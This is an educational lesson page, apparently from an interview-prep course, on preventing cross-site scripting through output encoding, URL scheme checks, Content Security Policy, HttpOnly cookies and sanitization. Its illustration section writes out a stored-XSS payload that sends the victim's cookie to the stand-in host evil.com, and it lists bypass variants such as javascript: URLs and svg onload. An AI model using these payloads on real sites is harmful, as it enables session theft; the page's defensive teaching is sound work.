---
slug: xss-prevention
module: sd-auth-security
title: XSS Prevention
subtitle: Stop attacker JS from running in your users' browsers — context-aware output encoding + CSP + HttpOnly cookies.
difficulty: Intermediate
position: 36
estimatedReadMinutes: 6
prereqs: []
relatedProblems: []
references:
  - title: "OWASP — XSS Prevention Cheat Sheet"
    url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
    type: book
  - title: "Content Security Policy — MDN"
    url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"
    type: blog
  - title: "cure53/DOMPurify — battle-tested HTML sanitizer"
    url: "https://github.com/cure53/DOMPurify"
    type: repo
status: published
---

## intro
**XSS** (Cross-Site Scripting) is when attacker-controlled input ends up in a browser as executable JavaScript, running with full access to the victim's session, cookies, DOM. Three flavors:
- **Stored**: attacker posts a comment containing `<script>steal()</script>`; every viewer runs it.
- **Reflected**: attacker sends a link `?q=<script>...</script>`; server echoes the query into the page; victim runs it.
- **DOM-based**: client-side JS unsafely uses `location.hash` / `innerHTML` / `eval` on user input.

Defenses are layered: **context-aware output encoding** (primary) + **Content Security Policy** + **HttpOnly cookies** + **input sanitization** for rich-text fields.

## whyItMatters
XSS is OWASP Top-10 perennial:
- Cookie theft → account takeover.
- Keystroke logging on the page.
- CSRF without CSRF tokens (since attacker JS is same-origin).
- Phishing (rewrite the page to look like a login).

Modern frameworks (React, Vue, Svelte) auto-escape by default, dramatically reducing XSS risk, but `dangerouslySetInnerHTML` / `v-html` / `{@html}` re-open the door.

## intuition
Every place where user input ends up in HTML, you're in a CONTEXT. Each context needs different escaping:
- **HTML text content** (`<div>{{ x }}</div>`): escape `< > & "` to entities.
- **HTML attribute** (`<input value="{{ x }}">`): escape `< > & " '`.
- **URL** (`<a href="{{ x }}">`): URL-encode + validate scheme (no `javascript:`).
- **JS string** (`<script>var x = "{{ x }}";</script>`): JS-escape (`<` etc.).
- **CSS** (`<style>color: {{ x }};</style>`): CSS-escape.

React's `{x}` defaults to HTML text context — safe. `dangerouslySetInnerHTML={{__html: x}}` skips escaping — UNSAFE unless x is sanitized.

## visualization
```
Stored XSS attack:
  Attacker posts comment:
    body = '<img src=x onerror="fetch(\'evil.com/?c=\' + document.cookie)">'
  Server stores it as text in `comments` table.
  Victim loads /post/123 → server emits:
    <div class="comment">${comment.body}</div>   ← raw HTML insert
  Browser parses <img>, fires onerror, sends victim's cookie to evil.com. ❌

Fix (output encoding):
  Server emits:
    <div class="comment">${escapeHtml(comment.body)}</div>
  becomes literally: &lt;img src=x onerror=...&gt;
  Browser renders the text, no <img> created, no JS runs. ✓

Or with CSP `default-src 'self'`:
  Even if <img> is injected, the onerror's fetch to evil.com is BLOCKED. ✓
```

## bruteForce
**Blacklist input** (regex out `<script>`): bypassed by `<ScRiPt>`, `<svg onload>`, `<iframe srcdoc>`, ... endless variants. Doesn't work.

**Sanitize input on save**: re-display in a different context (email, mobile app) needs different escaping. Save raw, escape per context.

**Hope frameworks escape everything**: usually true, but `dangerouslySetInnerHTML` + URL-attribute injection slip past.

Defense: layered output encoding + CSP + HttpOnly + sanitize HTML when truly needed.

## optimal
**1. Output encoding** — done by your template engine OR explicitly:
- React: `{x}` is safe. Never use `dangerouslySetInnerHTML` with untrusted input without sanitizing via DOMPurify.
- Jinja2: `{{ x }}` is safe by default; `{{ x|safe }}` is dangerous.
- Handlebars: `{{x}}` escapes; `{{{x}}}` does not.

**2. URL validation** for `href`/`src`:
```js
function safeUrl(u) {
  try {
    const url = new URL(u, location.origin);
    if (!['http:', 'https:', 'mailto:'].includes(url.protocol)) return '#';
    return url.href;
  } catch { return '#'; }
}
```
Blocks `javascript:alert(1)`, `data:text/html,...`.

**3. Content Security Policy** (HTTP header):
```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-abc123' https://cdn.example.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
```
Even if XSS injects `<script>`, it doesn't have the right nonce → browser refuses to execute.

**4. HttpOnly cookies**: session cookies set with `HttpOnly` flag cannot be read by JS → attacker JS can't `document.cookie` to exfiltrate them.

**5. Sanitize rich-text** (comments, blog posts, markdown rendering): use DOMPurify or equivalent. Allow a whitelist of tags + attributes; strip everything else.

## complexity
- **Output encoding**: O(len) per output operation. Negligible.
- **CSP header**: constant overhead.
- **HTML sanitization**: O(html_length) per render.

## pitfalls
- **`dangerouslySetInnerHTML` with un-sanitized input**: blow open. Always sanitize.
- **URL attributes with `javascript:` scheme**: `<a href={userInput}>` — if userInput = `javascript:alert(1)`, clicking runs JS. Validate scheme.
- **CSP `unsafe-inline` defeats most of the value**: inline `<script>` is the most common XSS payload.
- **innerText vs innerHTML**: setting `el.innerText = userInput` is safe; `el.innerHTML = userInput` is unsafe.
- **JSON in HTML**: embedding `<script>var data = {...};</script>` — make sure the JSON serializer escapes `</script>`.
- **Sanitizer bypasses**: DOMPurify is the safest choice; rolling your own = guaranteed bug. Update regularly.

## interviewTips
- For "how do you prevent XSS" → context-aware output encoding + CSP + HttpOnly + sanitize rich-text via DOMPurify.
- Distinguish stored / reflected / DOM-based.
- For senior: explain **CSP nonce vs hash** strategies, **report-only mode** for safe rollout, **Trusted Types API** (Chrome) for the next-gen mitigation.

## code.python
```python
# Flask + Jinja2 escapes {{ x }} by default
# Sanitize rich HTML for blog posts:
import bleach
clean = bleach.clean(user_html, tags=['p','a','b','i','code','pre'],
                     attributes={'a': ['href', 'title']}, protocols=['http','https','mailto'])

# CSP header
@app.after_request
def csp(resp):
    resp.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'"
    return resp
```

## code.javascript
```javascript
// React — safe by default
function Comment({ body }) {
  return <div className="comment">{body}</div>;  // auto-escaped
}

// Allowing rich HTML via DOMPurify
import DOMPurify from 'dompurify';
function RichComment({ body }) {
  const clean = DOMPurify.sanitize(body, { ALLOWED_TAGS: ['p','a','b','i','code'] });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}

// Express CSP middleware
const helmet = require('helmet');
app.use(helmet.contentSecurityPolicy({
  directives: { defaultSrc: ["'self'"], scriptSrc: ["'self'"] },
}));
```

## code.java
```java
// Spring escapes via Thymeleaf <p th:text="${userInput}">
// Sanitize rich HTML:
import org.owasp.html.PolicyFactory;
import org.owasp.html.Sanitizers;
PolicyFactory policy = Sanitizers.FORMATTING.and(Sanitizers.LINKS);
String safe = policy.sanitize(userHtml);
```

## code.cpp
```cpp
// HTML-escape user content before injection
std::string escape_html(const std::string& s) {
    std::string out;
    for (char c : s) {
        switch (c) {
            case '<': out += "&lt;"; break;
            case '>': out += "&gt;"; break;
            case '&': out += "&amp;"; break;
            case '"': out += "&quot;"; break;
            case '\'': out += "&#39;"; break;
            default: out += c;
        }
    }
    return out;
}
```
